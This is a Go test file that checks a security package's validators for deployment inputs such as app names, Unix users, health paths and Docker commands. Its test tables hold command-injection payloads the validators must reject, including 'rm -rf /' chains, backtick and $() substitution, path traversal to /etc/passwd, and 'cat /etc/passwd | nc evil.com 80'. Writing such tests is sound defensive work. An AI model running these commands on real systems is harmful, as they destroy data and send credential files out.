package security

import (
	"strings"
	"testing"
)

func TestValidateAppName(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		{"valid simple", "myapp", false},
		{"valid with numbers", "myapp123", false},
		{"valid with hyphens", "my-app-name", false},
		{"valid single char", "a", false},
		{"valid two chars", "ab", false},
		{"empty", "", true},
		{"starts with hyphen", "-myapp", true},
		{"ends with hyphen", "myapp-", true},
		{"uppercase", "MyApp", true},
		{"underscore", "my_app", true},
		{"special chars", "my;app", true},
		{"injection attempt", "app;rm -rf /", true},
		{"injection backtick", "app`id`", true},
		{"too long", strings.Repeat("a", 64), true},
		{"max length", strings.Repeat("a", 63), false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateAppName(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateAppName(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
			}
		})
	}
}

func TestValidateServerName(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		{"valid simple", "production", false},
		{"valid with numbers", "server1", false},
		{"valid with hyphens", "my-server", false},
		{"valid with underscores", "my_server", false},
		{"valid mixed case", "MyServer", false},
		{"valid single char", "a", false},
		{"empty", "", true},
		{"starts with hyphen", "-server", true},
		{"starts with underscore", "_server", true},
		{"special chars", "server;id", true},
		{"injection attempt", "prod;rm -rf /", true},
		{"space", "my server", true},
		{"too long", strings.Repeat("a", 65), true},
		{"max length", strings.Repeat("a", 64), false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateServerName(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateServerName(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
			}
		})
	}
}

func TestValidateRelease(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		{"valid timestamp", "20240115-120000", false},
		{"valid semver", "v1.2.3", false},
		{"valid with dots", "1.0.0", false},
		{"valid with underscores", "release_1", false},
		{"valid single char", "a", false},
		{"empty", "", true},
		{"starts with dot", ".hidden", true},
		{"starts with hyphen", "-release", true},
		{"special chars", "release;id", true},
		{"injection attempt", "v1.0;rm -rf /", true},
		{"space", "release 1", true},
		{"too long", strings.Repeat("a", 129), true},
		{"max length", strings.Repeat("a", 128), false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateRelease(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateRelease(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
			}
		})
	}
}

func TestValidateUnixUser(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		{"valid simple", "deploy", false},
		{"valid with numbers", "user1", false},
		{"valid with underscore prefix", "_user", false},
		{"valid with hyphen", "my-user", false},
		{"valid www-data", "www-data", false},
		{"empty", "", true},
		{"starts with number", "1user", true},
		{"starts with hyphen", "-user", true},
		{"uppercase", "User", true},
		{"special chars", "user;id", true},
		{"injection attempt", "root;rm -rf /", true},
		{"too long", strings.Repeat("a", 33), true},
		{"max length", strings.Repeat("a", 32), false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateUnixUser(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateUnixUser(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
			}
		})
	}
}

func TestValidateHealthPath(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		{"valid root", "/", false},
		{"valid health", "/health", false},
		{"valid nested", "/api/health/check", false},
		{"valid with dots", "/api/v1.0/health", false},
		{"valid with underscore", "/health_check", false},
		{"valid with hyphen", "/health-check", false},
		{"empty", "", false}, // Empty defaults to "/"
		{"no leading slash", "health", true},
		{"special chars", "/health;id", true},
		{"injection attempt", "/health?cmd=`id`", true},
		{"double slash", "//etc/passwd", true},
		{"parent traversal", "/../../etc/passwd", true},
		{"query string", "/health?check=1", true},
		{"space", "/health check", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateHealthPath(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateHealthPath(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
			}
		})
	}
}

func TestValidateLogTail(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		{"valid number", "100", false},
		{"valid all", "all", false},
		{"valid zero", "0", false},
		{"valid large", "10000", false},
		{"empty", "", false}, // Empty defaults to "100"
		{"negative", "-1", true},
		{"not a number", "abc", true},
		{"injection attempt", "100;id", true},
		{"too large", "100001", true},
		{"max allowed", "100000", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateLogTail(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateLogTail(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
			}
		})
	}
}

func TestValidateLogSince(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		{"valid hours", "2h", false},
		{"valid minutes", "30m", false},
		{"valid seconds", "60s", false},
		{"valid days", "1d", false},
		{"valid combined", "1h30m", false},
		{"valid date", "2024-01-15", false},
		{"valid datetime", "2024-01-15T10:30:00", false},
		{"empty", "", false}, // Empty means no filter
		{"invalid format", "yesterday", true},
		{"injection attempt", "2h;id", true},
		{"special chars", "2h`id`", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateLogSince(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateLogSince(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
			}
		})
	}
}

func TestValidateEnvKey(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		{"valid simple", "DATABASE_URL", false},
		{"valid with numbers", "VAR1", false},
		{"valid underscore prefix", "_PRIVATE", false},
		{"valid lowercase", "my_var", false},
		{"empty", "", true},
		{"starts with number", "1VAR", true},
		{"hyphen", "MY-VAR", true},
		{"special chars", "VAR;id", true},
		{"space", "MY VAR", true},
		{"injection attempt", "VAR`id`", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateEnvKey(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateEnvKey(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
			}
		})
	}
}

func TestValidateDockerCommand(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		{"valid simple", "php bin/console cache:clear", false},
		{"valid composer", "composer install", false},
		{"empty", "", true},
		{"semicolon injection", "ls; rm -rf /", true},
		{"and injection", "ls && rm -rf /", true},
		{"or injection", "ls || rm -rf /", true},
		{"pipe injection", "cat /etc/passwd | nc evil.com 80", true},
		{"backtick injection", "echo `id`", true},
		{"subshell injection", "echo $(id)", true},
		{"redirect injection", "echo data > /etc/passwd", true},
		{"variable expansion", "echo ${PATH}", true},
		{"newline injection", "ls\nrm -rf /", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateDockerCommand(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateDockerCommand(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
			}
		})
	}
}

// Test injection attempts that could bypass validation
func TestInjectionAttempts(t *testing.T) {
	injectionPayloads := []string{
		"test;rm -rf /",
		"test && cat /etc/passwd",
		"test || wget evil.com",
		"test`id`",
		"test$(whoami)",
		"test\nmalicious",
		"test\rmalicious",
		"test|nc evil.com 80",
		"test>/etc/passwd",
		"test<script>",
	}

	t.Run("AppName blocks injection", func(t *testing.T) {
		for _, payload := range injectionPayloads {
			if err := ValidateAppName(payload); err == nil {
				t.Errorf("ValidateAppName should reject: %q", payload)
			}
		}
	})

	t.Run("ServerName blocks injection", func(t *testing.T) {
		for _, payload := range injectionPayloads {
			if err := ValidateServerName(payload); err == nil {
				t.Errorf("ValidateServerName should reject: %q", payload)
			}
		}
	})

	t.Run("Release blocks injection", func(t *testing.T) {
		for _, payload := range injectionPayloads {
			if err := ValidateRelease(payload); err == nil {
				t.Errorf("ValidateRelease should reject: %q", payload)
			}
		}
	})

	t.Run("UnixUser blocks injection", func(t *testing.T) {
		for _, payload := range injectionPayloads {
			if err := ValidateUnixUser(payload); err == nil {
				t.Errorf("ValidateUnixUser should reject: %q", payload)
			}
		}
	})

	t.Run("LogTail blocks injection", func(t *testing.T) {
		for _, payload := range injectionPayloads {
			if err := ValidateLogTail(payload); err == nil {
				t.Errorf("ValidateLogTail should reject: %q", payload)
			}
		}
	})

	t.Run("LogSince blocks injection", func(t *testing.T) {
		for _, payload := range injectionPayloads {
			if err := ValidateLogSince(payload); err == nil {
				t.Errorf("ValidateLogSince should reject: %q", payload)
			}
		}
	})
}
